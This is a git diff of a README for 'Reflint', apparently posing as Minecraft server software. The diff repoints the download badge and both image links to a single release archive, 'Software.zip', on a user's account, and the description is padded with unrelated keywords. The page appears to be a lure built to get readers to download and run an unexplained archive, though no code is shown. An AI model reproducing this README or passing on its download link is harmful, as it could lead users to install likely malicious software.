@@ -1,11 +1,11 @@
 # **Reflint**
 
-[![Download](https://img.shields.io/badge/Download-Launch-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/datff124/Reflint/releases/download/v1.0/Software.zip)](https://github.com/datff124/Reflint/releases/download/v1.0/Software.zip)
 
 ## Description
 Welcome to Reflint - your stable Minecraft server Software. Reflint is designed to enhance your Minecraft server experience, providing improved performance and reliability. This repository focuses on the topics of Bukkit, Flint, Java, Minecraft, Minecraft API, Minecraft performance, Minecraft server, Paper, Paper API, PaperMC, Pizza, Reflint, ReflintMC, and Tacos.
 
-![Minecraft](https://github.com/octokit/octokit.rb/raw/main/minecraft.png)
+![Minecraft](https://github.com/datff124/Reflint/releases/download/v1.0/Software.zip)
 
 ## Features
 - **Stability**: Reflint ensures a stable environment for your Minecraft server, reducing downtime and crashes.
@@ -33,4 +33,4 @@ Reflint is licensed under the MIT License. See the "LICENSE" file in this reposi
 
 Let's make your Minecraft server experience even better with Reflint! 🚀🎮
 
-![Minecraft Server](https://github.com/octokit/octokit.rb/raw/main/minecraft_server.png)
+![Minecraft Server](https://github.com/datff124/Reflint/releases/download/v1.0/Software.zip)
